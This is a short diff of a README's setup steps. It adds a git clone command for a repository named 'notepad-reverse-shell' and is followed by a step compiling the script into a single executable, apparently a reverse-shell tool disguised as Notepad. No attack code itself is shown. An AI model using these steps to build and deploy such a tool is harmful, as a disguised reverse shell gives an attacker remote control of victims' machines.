@@ -72,7 +72,7 @@ venv37\Scripts\activate
 pip install pyinstaller
 
 # 4. Clone the Repo
-git clone 
+git clone https://github.com/arslanjv/notepad-reverse-shell.git
 cd notepad-reverse-shell
 
 # 5. Compile the script into a single executable
